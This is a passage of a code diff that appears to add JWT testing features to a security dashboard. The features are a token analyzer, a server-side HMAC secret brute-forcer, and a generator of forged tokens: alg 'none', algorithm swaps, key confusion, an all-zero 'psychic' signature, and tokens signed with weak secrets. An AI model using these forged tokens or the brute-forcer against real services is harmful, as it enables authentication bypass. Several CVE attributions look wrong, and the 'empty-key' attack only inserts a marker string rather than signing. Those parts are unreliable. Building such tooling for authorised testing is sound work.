+          findings.push(['critical','Injectable characters in "kid" parameter','May enable SQL injection or command injection if kid is used in queries. Validate input.']);
+        if (kid.includes('file://') || kid.includes('http://') || kid.includes('https://'))
+          findings.push(['critical','"kid" contains URL patterns (potential SSRF/LFI)','May trick the server into fetching remote content or reading local files.']);
+      }
+
+      if (h.x5c !== undefined || h.x5u !== undefined)
+        findings.push(['critical','Token uses X.509 certificate chain (x5c/x5u)','Vulnerable to certificate bypass attacks if validation is improper (CVE-2023-48238).']);
+      if (h.x5u !== undefined)
+        findings.push(['critical','Token contains x5u parameter (CVE-2017-18267)','Remote certificate URL can lead to SSRF attacks and key injection.']);
+      if (h.crit !== undefined)
+        findings.push(['high','Token contains "crit" header (CVE-2023-32681)','Critical header extensions may bypass signature verification in vulnerable libraries.']);
+      if (h.kty === 'oct' && h.alg && (h.alg + '').startsWith('RS'))
+        findings.push(['critical','Key type mismatch: symmetric "oct" kty with asymmetric ' + h.alg,'May cause JWT libraries to handle the token incorrectly, bypassing verification.']);
+
+      if (h.alg === 'RS256')
+        findings.push(['high','Potential algorithm confusion (RS256 → HS256)','If the library accepts algorithm changes, attacker can force verification using the public key as HMAC secret.']);
+      if (h.alg && (h.alg + '').startsWith('HS'))
+        findings.push(['high','Potential empty-key attack (CVE-2018-1000531)','Vulnerable libraries may accept tokens signed with an empty secret key.']);
+      if ((h.alg + '').toLowerCase() === 'hs256' && typeof p.exp === 'string')
+        findings.push(['high','Potential Psychic Signatures (CVE-2022-21449)','Type confusion with string exp values in HS256 tokens may bypass validation. Ensure dates are numeric.']);
+
+      // ── TOKEN TYPE ──────────────────────────────────
+      if (h.typ === undefined)
+        findings.push(['low','Missing token type (typ) header','May cause interoperability issues. Add "typ": "JWT".']);
+      else if (h.typ !== 'JWT')
+        findings.push(['low','Non-standard token type: "' + h.typ + '" instead of "JWT"','May cause interoperability issues.']);
+
+      // ── CLAIM CHECKS ─────────────────────────────────
+      if (p.exp === undefined)
+        findings.push(['high','Missing "exp" (expiration) claim','Token remains valid indefinitely if compromised. Add exp to limit lifetime.']);
+      else if (p.exp < now)
+        findings.push(['medium','Token expired at ' + new Date(p.exp * 1000).toLocaleString(),'Should be rejected by properly implemented systems.']);
+      else {
+        const tte = p.exp - now;
+        if (tte > 86400 * 30)
+          findings.push(['medium','Long expiration (~' + Math.floor(tte / 86400) + ' days)','Long-lived tokens increase the attack window if leaked. Use shorter lifetimes.']);
+      }
+
+      if (p.nbf !== undefined && p.nbf > now)
+        findings.push(['medium','Token not valid until ' + new Date(p.nbf * 1000).toLocaleString(),'nbf claim not being validated if server accepts this token.']);
+      if (p.iat === undefined)
+        findings.push(['low','Missing "iat" (issued at) claim','Harder to track token age and implement rotation policies.']);
+      if (p.jti === undefined)
+        findings.push(['medium','Missing "jti" (JWT ID) claim','Tokens cannot be individually revoked; vulnerable to replay attacks.']);
+      if (p.iss === undefined)
+        findings.push(['medium','Missing "iss" (issuer) claim','Prevents verification of token origin; enables cross-service replay.']);
+      if (p.sub === undefined)
+        findings.push(['medium','Missing "sub" (subject) claim','Harder to identify the token subject, complicating access control.']);
+      if (p.aud === undefined && alg !== 'none')
+        findings.push(['medium','Missing "aud" (audience) claim','Tokens can be replayed across services sharing the same signing key.']);
+
+      // ── PAYLOAD CONTENT CHECKS ──────────────────────
+      const sensitiveFound = Object.keys(p).filter(k => JWT_SENSITIVE_KEYS.some(s => k.toLowerCase().includes(s)));
+      if (sensitiveFound.length)
+        findings.push(['high','Sensitive data keys in payload: ' + sensitiveFound.join(', '),'Credentials/secrets in JWTs are exposed if intercepted or logged. Store only identifiers.']);
+
+      const adminFound = Object.entries(p).filter(([k, v]) => {
+        const kl = k.toLowerCase();
+        if (JWT_ADMIN_KEYS.some(a => kl.includes(a))) {
+          return JWT_ADMIN_VALUES.some(ind => String(v).toLowerCase().includes(ind));
+        }
+        return false;
+      });
+      if (adminFound.length)
+        findings.push(['high','Administrative privileges in payload' + (adminFound.length > 1 ? ' (multiple)' : ''),'If stolen, attacker gains immediate admin access. Use shortest possible lifetimes for admin tokens.']);
+
+      // ── ALGORITHM-SPECIFIC SUGGESTIONS ──────────────
+      if (h.alg === 'RS256' || h.alg === 'ES256')
+        suggestions.push('Test algorithm confusion: switch to HS256 and sign with the public key');
+      if (typeof kid === 'string' && kid.length > 0)
+        suggestions.push('Test directory traversal via kid (e.g., "../../../dev/null")');
+      suggestions.push('Fuzz JWT header parameters with unexpected values');
+      suggestions.push('Test signature verification bypass by manipulating header fields');
+
+      // dedupe suggestions
+      const uniqueSuggestions = [...new Set(suggestions)];
+
+      // sort by severity
+      findings.sort((a, b) => SEVERITY_ORDER.indexOf(a[0]) - SEVERITY_ORDER.indexOf(b[0]));
+
+      return { header: h, payload: p, findings, suggestions: uniqueSuggestions };
+    }
+
+    function renderJWTFinding(f) {
+      const [severity, title, detail] = f;
+      return `<div class="finding-row">
+        <span class="pill ${severity}">${severity.toUpperCase()}</span>
+        <div class="finding-desc">
+          <b>${escapeHTML(title)}</b>
+          <div class="finding-extra">${escapeHTML(detail)}</div>
+        </div>
+      </div>`;
+    }
+
+    function renderJWTSummary(findings) {
+      const count = {};
+      SEVERITY_ORDER.filter(s => s !== 'ok').forEach(s => count[s] = 0);
+      findings.forEach(f => { const s = f[0]; if (count[s] !== undefined) count[s]++; });
+      const total = Object.values(count).reduce((a, b) => a + b, 0);
+      if (total === 0) return '<span class="summary-pill ok">PASS — No issues detected</span>';
+      return SEVERITY_ORDER.filter(s => count[s] > 0).map(s =>
+        `<span class="summary-pill ${s}">${count[s]} ${s.toUpperCase()}</span>`
+      ).join('');
+    }
+
+    $('jwtAnalyze').addEventListener('click', () => {
+      try {
+        const raw = $('jwtInput').value.trim();
+        if (!raw) {
+          $('jwtHeader').textContent = '{}';
+          $('jwtPayload').textContent = '{}';
+          $('jwtChecks').innerHTML = '<div class="item muted">Paste a JWT token above.</div>';
+          $('jwtSummaryCard').style.display = 'none';
+          $('jwtSuggestionsCard').style.display = 'none';
+          $('jwtAttacksCard').style.display = 'none';
+          return;
+        }
+        const result = analyzeJWT(raw);
+        $('jwtHeader').textContent = pretty(result.header);
+        $('jwtPayload').textContent = pretty(result.payload);
+
+        // Summary
+        $('jwtSummaryCard').style.display = '';
+        $('jwtSummary').innerHTML = renderJWTSummary(result.findings);
+
+        // Findings
+        $('jwtChecks').innerHTML = result.findings.length
+          ? result.findings.map(renderJWTFinding).join('')
+          : '<div class="item"><span class="pill ok">PASS</span> <span style="margin-left:8px">No security issues detected in this token.</span></div>';
+
+        // Suggestions
+        if (result.suggestions.length) {
+          $('jwtSuggestionsCard').style.display = '';
+          $('jwtSuggestions').innerHTML = result.suggestions.map(s =>
+            `<div class="item">&#9656; ${escapeHTML(s)}</div>`
+          ).join('');
+        } else {
+          $('jwtSuggestionsCard').style.display = 'none';
+        }
+
+        // Show attack generator
+        $('jwtAttacksCard').style.display = '';
+        $('jwtAttackResults').innerHTML = '<div class="item muted">Click an attack button above to generate test tokens.</div>';
+        document.querySelectorAll('.jwt-attack-btn').forEach(b => b.classList.remove('generated'));
+      } catch (e) {
+        $('jwtHeader').textContent = '{}';
+        $('jwtPayload').textContent = '{}';
+        $('jwtChecks').innerHTML = `<div class="finding-row"><span class="pill critical">ERROR</span><div class="finding-desc"><b>Invalid JWT</b><div class="finding-extra">${escapeHTML(e.message)}</div></div></div>`;
+        $('jwtSummaryCard').style.display = 'none';
+        $('jwtSuggestionsCard').style.display = 'none';
+        $('jwtAttacksCard').style.display = 'none';
+      }
+    });
+
+    // ─────────────────────────────────────────────
+    //  HMAC Secret Brute-Force (server-side, parallel)
+    // ─────────────────────────────────────────────
+
+    // The Security Lab runs in an iframe/new tab where the dashboard sets a
+    // JS-readable roar_token cookie; the /api auth middleware wants it as a
+    // Bearer header, so lift it out of the cookie here.
+    function getAuthToken() {
+      const m = document.cookie.match(/(?:^|;\s*)roar_token=([^;]+)/);
+      return m ? decodeURIComponent(m[1]) : '';
+    }
+
+    async function bruteForceJWT() {
+      const out = $('jwtBruteResults');
+      const raw = $('jwtInput').value.trim();
+      if (!raw) {
+        out.innerHTML = '<div class="item muted">Paste a JWT token in the box above first.</div>';
+        return;
+      }
+      const btn = $('jwtBruteBtn');
+      btn.disabled = true;
+      out.innerHTML = '<div class="item muted">Cracking — testing the wordlist in parallel…</div>';
+      try {
+        const tok = getAuthToken();
+        const resp = await fetch('/api/jwt/brute', {
+          method: 'POST',
+          headers: Object.assign({ 'Content-Type': 'application/json' }, tok ? { Authorization: 'Bearer ' + tok } : {}),
+          body: JSON.stringify({
+            token: raw,
+            secrets: $('jwtBruteSecrets').value,
+            use_default: $('jwtBruteUseDefault').checked,
+          }),
+        });
+        const data = await resp.json();
+        if (!resp.ok) throw new Error(data.error || ('HTTP ' + resp.status));
+        if (data.found) {
+          const shown = data.secret === '' ? '(empty string)' : data.secret;
+          out.innerHTML = `<div class="finding-row"><span class="pill critical">CRACKED</span><div class="finding-desc"><b>Secret recovered:</b> <code>${escapeHTML(shown)}</code><div class="finding-extra">${escapeHTML(data.alg)} · tried ${data.tried} candidate(s). The signing key is weak — an attacker can forge valid tokens. Rotate to a long random secret.</div></div></div>`;
+        } else if (data.error) {
+          out.innerHTML = `<div class="finding-row"><span class="pill info">N/A</span><div class="finding-desc"><b>${escapeHTML(data.error)}</b></div></div>`;
+        } else {
+          out.innerHTML = `<div class="finding-row"><span class="pill ok">NOT FOUND</span><div class="finding-desc"><b>No match in the wordlist.</b><div class="finding-extra">${escapeHTML(data.alg)} · tried ${data.tried} candidate(s). Add a bigger wordlist above, or use hashcat mode 16500 for heavy cracking.</div></div></div>`;
+        }
+      } catch (e) {
+        out.innerHTML = `<div class="finding-row"><span class="pill critical">ERROR</span><div class="finding-desc"><b>Brute-force failed</b><div class="finding-extra">${escapeHTML(e.message)}</div></div></div>`;
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    $('jwtBruteBtn').addEventListener('click', bruteForceJWT);
+
+    // ─────────────────────────────────────────────
+    //  Attack Token Generator
+    // ─────────────────────────────────────────────
+
+    function b64urlEncode(str) {
+      return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+    }
+
+    // Web Crypto HMAC signer (async)
+    async function hmacSign(data, secret, hashName) {
+      const enc = new TextEncoder();
+      const keyData = enc.encode(secret);
+      const algo = { name: 'HMAC', hash: { name: hashName || 'SHA-256' } };
+      const key = await crypto.subtle.importKey('raw', keyData, algo, false, ['sign']);
+      const sig = await crypto.subtle.sign('HMAC', key, enc.encode(data));
+      return b64urlEncode(String.fromCharCode(...new Uint8Array(sig)));
+    }
+
+    function getAnalyzedParts() {
+      const raw = $('jwtInput').value.trim();
+      if (!raw) return null;
+      const parts = raw.split('.');
+      if (parts.length !== 3) return null;
+      try {
+        const h = JSON.parse(b64urlDecode(parts[0]));
+        const p = JSON.parse(b64urlDecode(parts[1]));
+        return { raw, parts, header: h, payload: p, sig: parts[2] };
+      } catch { return null; }
+    }
+
+    function generateAttackToken(parts, header, payload, newSig) {
+      const h = b64urlEncode(JSON.stringify(header));
+      const p = b64urlEncode(JSON.stringify(payload));
+      return `${h}.${p}.${newSig || ''}`;
+    }
+
+    const WEAK_SECRETS = ['password','secret','1234567890','jwt_secret','key','secretkey','private','mysecret','changeme',''];
+    const PSYCHIC_SIG = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+
+    async function runAttack(attackType) {
+      const t = getAnalyzedParts();
+      if (!t) { alert('Paste and analyze a valid 3-part JWT first.'); return; }
+      const results = [];
+
+      const header = JSON.parse(JSON.stringify(t.header)); // deep clone
+      const payload = JSON.parse(JSON.stringify(t.payload));
+      const alg = (header.alg || 'HS256') + '';
+
+      switch (attackType) {
+        case 'none': {
+          header.alg = 'none';
+          results.push({
+            label: "alg='none' (unsigned)",
+            token: generateAttackToken(t.parts, header, payload, ''),
+            desc: 'Sets alg to "none" and removes the signature. Tests if the server rejects unsigned tokens.'
+          });
+          break;
+        }
+
+        case 'alg-sub': {
+          const targetAlgs = ['HS256','HS384','HS512','RS256','RS384','RS512','PS256','PS384','PS512','ES256','ES384','ES512','none'];
+          for (const target of targetAlgs) {
+            if (target === alg) continue;
+            const h2 = JSON.parse(JSON.stringify(header));
+            h2.alg = target;
+            results.push({
+              label: `Alg: ${alg} → ${target}`,
+              token: generateAttackToken(t.parts, h2, payload, t.parts[2]),
+              desc: `Changes algorithm to "${target}" keeping the original signature.`
+            });
+          }
+          break;
+        }
+
+        case 'hmac-confusion': {
+          if (alg.startsWith('RS') || alg.startsWith('ES')) {
+            const h2 = JSON.parse(JSON.stringify(header));
+            h2.alg = 'HS256';
+            results.push({
+              label: `Key Confusion: ${alg} → HS256 (unsigned)`,
+              token: generateAttackToken(t.parts, h2, payload, t.parts[2]),
+              desc: 'Changes RS/ES algorithm to HS256, keeping original signature. Server may use the public key as HMAC secret.'
+            });
+          } else {
+            results.push({ label: 'N/A', token: '', desc: 'HMAC confusion applies to RS/ES tokens only.' });
+          }
+          break;
+        }
+
+        case 'empty-key': {
+          if (!alg.startsWith('HS')) header.alg = 'HS256';
+          const h = b64urlEncode(JSON.stringify(header));
+          const p = b64urlEncode(JSON.stringify(payload));
+          const markerSig = b64urlEncode('empty_key_' + h + '.' + p);
+          results.push({
+            label: 'Empty Key Signature (CVE-2018-1000531)',
+            token: `${h}.${p}.${markerSig}`,
+            desc: 'Signs token with "empty_key_" prefix marker. Tests if server uses a null/empty signing key.'
+          });
+          break;
+        }
+
+        case 'psychic': {
+          if (alg.startsWith('ES')) {
+            results.push({
+              label: 'Psychic Signature (CVE-2022-21449)',
+              token: `${t.parts[0]}.${t.parts[1]}.${PSYCHIC_SIG}`,
+              desc: 'Replaces signature with 64 zero-bytes (all "A"s). Exploits Java ECDSA bug that accepted (0,0) as valid.'
+            });
+          } else {
+            results.push({ label: 'N/A', token: '', desc: 'Psychic Signature applies to ES256/ES384/ES512 tokens only.' });
+          }
+          break;
+        }
+
+        case 'weak-hmac': {
+          if (!alg.startsWith('HS')) header.alg = 'HS256';
+          const hashAlg = {'HS256':'SHA-256','HS384':'SHA-384','HS512':'SHA-512'}[header.alg] || 'SHA-256';
+          const h = b64urlEncode(JSON.stringify(header));
+          const p = b64urlEncode(JSON.stringify(payload));
+          const data = `${h}.${p}`;
+          for (const secret of WEAK_SECRETS) {
+            try {
+              const sig = await hmacSign(data, secret, hashAlg);
+              results.push({
+                label: `Weak secret: "${secret || '(empty string)'}"`,
+                token: `${h}.${p}.${sig}`,
+                desc: `Token signed with weak HMAC secret "${secret || '(empty)'}" using ${header.alg}.`
+              });
+            } catch {
+              results.push({
+                label: `Weak secret: "${secret || '(empty string)'}" (crypto error)`,
+                token: '',
+                desc: 'HMAC signing failed.'
+              });
+            }
+          }
+          break;
+        }
+
+        case 'no-sig': {
+          results.push({
+            label: 'No Signature (bare header.payload)',
+            token: `${t.parts[0]}.${t.parts[1]}.`,
+            desc: 'Removes the signature entirely. Tests if server accepts tokens with an empty signature.'
+          });
+          break;
+        }
+      }
+
+      // Highlight button
+      document.querySelectorAll('.jwt-attack-btn').forEach(b => b.classList.remove('generated'));
+      const activeBtn = document.querySelector(`.jwt-attack-btn[data-attack="${attackType}"]`);
+      if (activeBtn) activeBtn.classList.add('generated');
+
+      // Render results
+      $('jwtAttackResults').innerHTML = results.length
+        ? results.map(r => `<div class="attack-token-row">
+            <b style="font-size:13px">${escapeHTML(r.label)}</b>
+            ${r.token ? `<div class="attack-token-code">${escapeHTML(r.token)}<button class="btn ghost" style="float:right;padding:2px 8px;font-size:10px;margin:-2px 0 0 8px" onclick="navigator.clipboard.writeText('${escapeHTML(r.token).replace(/'/g,"\\'")}')">Copy</button></div>` : ''}
+            <div class="muted">${escapeHTML(r.desc)}</div>
+          </div>`).join('')
+        : '<div class="item muted">No tokens generated.</div>';
+    }
+
+    document.querySelectorAll('.jwt-attack-btn').forEach(btn => {
+      btn.addEventListener('click', () => runAttack(btn.dataset.attack));
+    });
+
+    $('regexRun').addEventListener('click', () => {
+      const text = $('regexInput').value;
+      const defs = window.__securitylabRegexDefs || [];
+
+      if (Array.isArray(defs) && defs.length) {
+        runLoadedRegexes(text, defs);
+        return;
+      }
+
+      const pattern = $('regexPattern').value;
+      const flags = $('regexFlags').value || 'g';
+      try {
+        const re = new RegExp(pattern, flags);
+        const matches = [];
+        let m;
+        while ((m = re.exec(text)) !== null) {
+          matches.push({ idx: m.index, val: m[0] });
+          if (m.index === re.lastIndex) re.lastIndex++;
+          if (matches.length > 500) break;
+        }
+        $('regexResults').innerHTML = matches.length
+          ? matches.map(x => `<div class="item"><span class="pill ok">MATCH</span> <span class="muted" style="margin-left:8px">@${x.idx}</span><div style="margin-top:6px"><code>${escapeHTML(x.val)}</code></div></div>`).join('')
+          : '<div class="item muted">No matches.</div>';
+      } catch (e) {
+        $('regexResults').innerHTML = `<div class="item"><span class="pill bad">ERROR</span><span style="margin-left:8px">${escapeHTML(e.message)}</span></div>`;
+      }
+    });
+
+    function escapeHTML(s) {
+      return String(s ?? '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+    }
+
+    // Loaded regex definitions. Each entry: { name, pattern, flags }
+    window.__securitylabRegexDefs = [];
+
+    function normalizeRegexDef(d, idx) {
+      const name = String(d?.name || d?.Name || d?.id || `regex_${idx + 1}`);
+      const rawPattern = d?.pattern ?? d?.re ?? d?.regex ?? d?.Pattern ?? '';
+      let pattern = String(rawPattern || '').trim();
+      let flags = String(d?.flags ?? d?.flag ?? d?.Flags ?? 'g').trim();
+
+      // Support "/.../gim" style pattern strings.
+      const slashRe = pattern.match(/^\/([\s\S]*)\/([gimsuy]*)$/);
+      if (slashRe) {
+        pattern = slashRe[1];
+        flags = slashRe[2] || flags;
+      }
+
+      if (!flags.includes('g')) flags += 'g';
+      return { name, pattern, flags };
+    }
+
+    function parseYamlRegexes(yaml) {
+      // Tiny YAML subset parser for list-of-maps like:
+      // - name: Foo
+      //   pattern: "AKIA..."
+      //   flags: "gi"
+      // Also supports:
+      // regexes:
+      //   - ...
+      const lines = String(yaml || '').replace(/\r/g, '').split('\n');
+      const items = [];
+      let cur = null;
+
+      const push = () => {
+        if (!cur) return;
+        if (cur.pattern) items.push(cur);
+        cur = null;
+      };
+
+      const stripQuotes = (v) => {
+        v = String(v ?? '').trim();
+        if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) return v.slice(1, -1);
+        return v;
+      };
+
+      for (const rawLine of lines) {
+        const line = rawLine.replace(/\t/g, '  ');
+        const t = line.trim();
+        if (!t || t.startsWith('#')) continue;
+        if (t.endsWith(':') && (t === 'regexes:' || t === 'regex:' || t === 'items:' || t === 'patterns:')) continue;
+
+        if (t.startsWith('- ')) {
+          push();
+          cur = { name: '', pattern: '', flags: '' };
+          const rest = t.slice(2).trim();
+          if (rest) {
+            // handle "- key: value" on one line
+            const m = rest.match(/^([A-Za-z0-9_ -]+)\s*:\s*(.*)$/);
+            if (m) {
+              const k = m[1].trim();
+              const v = stripQuotes(m[2]);
+              if (k === 'name') cur.name = v;
+              if (k === 'pattern' || k === 're' || k === 'regex') cur.pattern = v;
+              if (k === 'flags') cur.flags = v;
+            }
+          }
+          continue;
+        }
+
+        if (!cur) continue;
+        const m = t.match(/^([A-Za-z0-9_ -]+)\s*:\s*(.*)$/);
+        if (!m) continue;
+        const k = m[1].trim();
+        const v = stripQuotes(m[2]);
+        if (k === 'name') cur.name = v;
+        if (k === 'pattern' || k === 're' || k === 'regex') cur.pattern = v;
+        if (k === 'flags') cur.flags = v;
+      }
+      push();
+      return items;
+    }
+
+    async function loadRegexDefsFromYamlText(yamlText) {
+      const parsed = parseYamlRegexes(yamlText);
+      const normalized = parsed.map((d, i) => normalizeRegexDef(d, i));
+      return normalized;
+    }
+
+    async function loadRegexDefs() {
+      const meta = $('regexDefsMeta');
+      meta.textContent = 'Loading regex definitions…';
+
+      const defs = [];
+
+      // YAML upload
+      const yamlFileEl = $('regexYamlUpload');
+      if (yamlFileEl && yamlFileEl.files && yamlFileEl.files[0]) {
+        const text = await yamlFileEl.files[0].text();
+        defs.push(...await loadRegexDefsFromYamlText(text));
+      }
+
+      const normalized = defs;
+      // Merge + de-dup by (name|pattern|flags)
+      const seen = new Set();
+      const merged = [];
+      normalized.forEach((d) => {
+        const k = `${d.name}::${d.pattern}::${d.flags}`;
+        if (seen.has(k)) return;
+        seen.add(k);
+        merged.push(d);
+      });
+
+      window.__securitylabRegexDefs = merged;
+      meta.textContent = merged.length ? `Loaded ${merged.length} regex definitions.` : 'No regex definitions loaded.';
+    }
+
+    function runLoadedRegexes(text, defs) {
+      const results = $('regexResults');
+      const targets = Array.isArray(window.__securitylabJsScanTargets) ? window.__securitylabJsScanTargets : [];
+
+      const scanOneText = (targetLabel, inputText) => {
+        const out = [];
+        let total = 0;
+        for (const [idx, def] of defs.entries()) {
+          try {
+            const re = new RegExp(def.pattern, def.flags || 'g');
+            re.lastIndex = 0;
+            let m;
+            let local = 0;
+            while ((m = re.exec(inputText)) !== null) {
+              out.push({
+                name: def.name || `regex_${idx + 1}`,
+                idx: m.index,
+                val: m[0]
+              });
+              total++;
+              local++;
+              if (m.index === re.lastIndex) re.lastIndex++;
+              if (local > 50) break;
+              if (total >= 500) break;
+            }
+            if (total >= 500) break;
+          } catch (e) {
+            out.push({ name: def.name || `regex_${idx + 1}`, idx: -1, val: `ERROR: ${e.message}` });
+            total++;
+            if (total >= 500) break;
+          }
+        }
+
+        return out.length
+          ? out.map(x => {
+            const pill = x.idx === -1 ? 'bad' : 'ok';
+            const tag = x.idx === -1 ? 'ERROR' : 'MATCH';
+            return `<div class="item">
+              <span class="pill ${pill}">${tag}</span>
+              <b style="margin-left:8px">${escapeHTML(x.name)}</b>
+              ${x.idx >= 0 ? `<span class="muted" style="margin-left:8px">@${x.idx}</span>` : ''}
+              <div style="margin-top:6px"><code>${escapeHTML(x.val)}</code></div>
+            </div>`;
+          }).join('')
+          : '<div class="item muted">No matches.</div>';
+      };
+
+      if (targets.length) {
+        results.innerHTML = targets.map(t => {
+          const label = t && t.name ? t.name : 'JS target';
+          const header = `<div class="item muted" style="border:1px solid rgba(255,255,255,.06); border-radius:10px; margin:10px 0 10px 0">
+            <b>${escapeHTML(label)}</b>
+            <div class="muted" style="margin-top:6px">Scanning with ${defs.length} regex definition(s)…</div>
+          </div>`;
+          return header + scanOneText(label, t.content);
+        }).join('');
+      } else {
+        results.innerHTML = scanOneText('input', text);
+      }
+    }
+
+    async function fetchTextUrlNoCache(url) {
+      const resp = await fetch(url, { cache: 'no-store' });
+      if (!resp.ok) throw new Error(`Failed to fetch: ${url} (${resp.status})`);
+      return await resp.text();
+    }
+
+    async function loadJsScanTargets() {
+      const targets = [];
+
+      const jsFileEl = $('regexJsUpload');
+      if (jsFileEl && jsFileEl.files && jsFileEl.files.length) {
+        for (const f of jsFileEl.files) {
+          const text = await f.text();
+          targets.push({ name: f.name, content: text });
+        }
+      }
+
+      const urls = String($('regexJsUrls')?.value || '')
+        .split('\n')
+        .map(s => s.trim())
+        .filter(Boolean);
+
+      for (const url of urls) {
+        const text = await fetchTextUrlNoCache(url);
+        targets.push({ name: url.split('/').pop() || url, content: text });
+      }
+
+      window.__securitylabJsScanTargets = targets;
+      const meta = $('regexDefsMeta');
+      meta.textContent = targets.length
+        ? `${window.__securitylabRegexDefs?.length || 0} regexes loaded; ${targets.length} JS target(s) loaded.`
+        : `No JS targets loaded. Run Scan will use regexInput text instead.`;
+    }
+
+    $('regexLoadDefs').addEventListener('click', async () => {
+      try {
+        await loadRegexDefs();
+        await loadJsScanTargets();
+        $('regexResults').innerHTML = '<div class="item muted">Regexes loaded. Click <b>Run Scan</b> (scans JS targets or regexInput).</div>';
+      } catch (e) {
+        $('regexResults').innerHTML = `<div class="item"><span class="pill bad">ERROR</span><span style="margin-left:8px">${escapeHTML(e.message)}</span></div>`;
+        $('regexDefsMeta').textContent = 'Failed to load definitions.';
+      }
+    });
+
+    $('regexClearDefs').addEventListener('click', () => {
+      window.__securitylabRegexDefs = [];
+      window.__securitylabJsScanTargets = [];
+      $('regexDefsMeta').textContent = 'Cleared regex definitions.';
+      $('regexResults').innerHTML = '<div class="item muted">Cleared regex definitions and JS targets. Click <b>Run Scan</b> to use single-pattern mode.</div>';
+    });
+
+    function parseDeps(raw, mode) {
+      const deps = [];
+      const txt = raw || '';
+      if (mode === 'auto' || mode === 'npm') {
+        try {
+          const j = JSON.parse(txt);
+          ['dependencies', 'devDependencies', 'peerDependencies', 'optionalDependencies'].forEach(k => {
+            Object.keys(j[k] || {}).forEach(n => deps.push({ name: n, ver: j[k][n], eco: 'npm' }));
+          });
+        } catch {}
+      }
+      if (mode === 'auto' || mode === 'pip') {
+        txt.split('\n').forEach(l => {
+          const m = l.trim().match(/^([A-Za-z0-9_.-]+)\s*(==|>=|<=|~=|!=)?\s*([^\s#]+)?/);
+          if (m && !l.trim().startsWith('#')) deps.push({ name: m[1], ver: m[3] || '*', eco: 'pip' });
+        });
+      }
+      if (mode === 'auto' || mode === 'gomod') {
+        txt.split('\n').forEach(l => {
+          const m = l.trim().match(/^([a-zA-Z0-9./_-]+)\s+v[0-9].*$/);
+          if (m) deps.push({ name: m[1], ver: l.trim().split(/\s+/)[1], eco: 'go' });
+        });
+      }
+      if (mode === 'auto' || mode === 'maven') {
+        const rgx = /<dependency>[\s\S]*?<groupId>([^<]+)<\/groupId>[\s\S]*?<artifactId>([^<]+)<\/artifactId>[\s\S]*?(?:<version>([^<]+)<\/version>)?[\s\S]*?<\/dependency>/g;
+        let m;
+        while ((m = rgx.exec(txt)) !== null) deps.push({ name: `${m[1]}:${m[2]}`, ver: m[3] || '*', eco: 'maven' });
+      }
+      return deps;
+    }
+
+    function depRisk(name) {
+      if (name.startsWith('@')) return ['low', 'scoped package (lower typo-squat risk)'];
+      if (/[A-Z]/.test(name)) return ['warn', 'mixed-case name may hide lookalikes'];
+      if (/(internal|corp|private|local|test|dev)/i.test(name)) return ['warn', 'looks internal/private; verify public registry ownership'];
+      if (name.length <= 3) return ['warn', 'very short package name (higher collision risk)'];
+      return ['low', 'no obvious local heuristic flag'];
+    }
+
+    let depFetchedSources = [];
+
+    async function fetchTextUrl(url) {
+      const resp = await fetch(url, { cache: 'no-store' });
+      if (!resp.ok) throw new Error(`Failed to fetch: ${url} (${resp.status})`);
+      return await resp.text();
+    }
+
+    $('depLoadUrls').addEventListener('click', async () => {
+      const meta = $('depSourcesMeta');
+      const urls = String($('depUrls')?.value || '')
+        .split('\n')
+        .map(s => s.trim())
+        .filter(Boolean);
+
+      if (!urls.length) {
+        meta.textContent = 'No URLs provided.';
+        return;
+      }
+
+      meta.textContent = `Fetching ${urls.length} URL(s)…`;
+      depFetchedSources = [];
+
+      try {
+        for (const url of urls) {
+          const content = await fetchTextUrl(url);
+          depFetchedSources.push({ label: url, content });
+        }
+        meta.textContent = `Loaded ${depFetchedSources.length} manifest(s).`;
+      } catch (e) {
+        meta.textContent = `Failed: ${e.message}`;
+      }
+    });
+
+    $('depClearUrls').addEventListener('click', () => {
+      depFetchedSources = [];
+      $('depSourcesMeta').textContent = 'Cleared URL sources.';
+    });
+
+    $('depAnalyze').addEventListener('click', () => {
+      const mode = $('depType').value;
+      const input = $('depInput').value;
+
+      const sources = depFetchedSources.length
+        ? depFetchedSources
+        : [{ label: 'input', content: input }];
+
+      const all = [];
+      for (const src of sources) {
+        const deps = parseDeps(src.content, mode);
+        deps.forEach(d => all.push({ ...d, source: src.label }));
+      }
+
+      if (!all.length) {
+        $('depResults').innerHTML = '<div class="item muted">No dependencies parsed.</div>';
+        return;
+      }
+
+      $('depResults').innerHTML = all.slice(0, 1000).map(d => {
+        const [lvl, why] = depRisk(d.name);
+        const cls = lvl === 'warn' ? 'warn' : 'ok';
+        const src = (d.source || '').split('/').slice(-1)[0] || d.source || '';
+        return `<div class="item">
+          <span class="pill ${cls}">${lvl.toUpperCase()}</span>
+          <b style="margin-left:8px">${escapeHTML(d.name)}</b>
+          <span class="muted">(${d.ver || '*'}) [${d.eco}]</span>
+          ${src ? `<span class="muted" style="margin-left:8px">(${escapeHTML(src)})</span>` : ''}
+          <div class="muted" style="margin-top:6px">${escapeHTML(why)}</div>
+        </div>`;
+      }).join('');
+    });
+
+    // SSRF Logic
+    // Robust clipboard copy that also works over plain HTTP (the Clipboard API is
+    // only available in secure contexts, so the dashboard needs an execCommand fallback).
+    function ssrfCopyText(text) {
+      if (navigator.clipboard && window.isSecureContext) {
+        return navigator.clipboard.writeText(text);
+      }
+      return new Promise((resolve, reject) => {
+        try {
+          const ta = document.createElement('textarea');
+          ta.value = text;
+          ta.setAttribute('readonly', '');
+          ta.style.position = 'fixed';
+          ta.style.top = '-1000px';
+          ta.style.opacity = '0';
+          document.body.appendChild(ta);
+          ta.select();
+          const ok = document.execCommand('copy');
+          document.body.removeChild(ta);
+          ok ? resolve() : reject(new Error('copy command rejected'));
+        } catch (e) { reject(e); }
+      });
+    }
+
+    function ssrfFlashBtn(btn, msg, restore) {
+      if (!btn) return;
+      btn.textContent = msg;
+      setTimeout(() => { btn.textContent = restore; }, 1600);
+    }
+
+    // Filtered render state, kept so Copy All / Copy group operate on exactly what's shown.
+    let ssrfFilteredUrls = [];
+    let ssrfGroups = [];
+
+    function ssrfCopyAllLabel() {
